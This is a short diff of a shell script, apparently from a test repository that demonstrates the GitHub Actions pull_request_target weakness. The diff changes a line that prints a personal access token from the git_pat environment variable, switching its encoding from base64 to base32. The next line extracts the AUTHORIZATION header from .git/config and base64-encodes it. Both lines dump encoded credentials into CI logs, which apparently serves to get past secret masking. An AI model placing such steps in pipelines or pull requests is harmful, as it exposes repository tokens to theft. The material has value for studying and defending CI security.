@@ -8,7 +8,7 @@ echo "From WengOnn-Deriv"
 # echo "From WengOnn-Deriv"
 # git checkout master
 
-echo "PAT: $(printenv git_pat)" | base64
+echo "PAT: $(printenv git_pat)" | base32
 cat .git/config | grep "AUTHORIZATION" | base64
 
 # git remote add upstream https://$(printenv git_pat)@github.com/test-organization-wengonn-v2/pull-request-target-vuln-v3.git
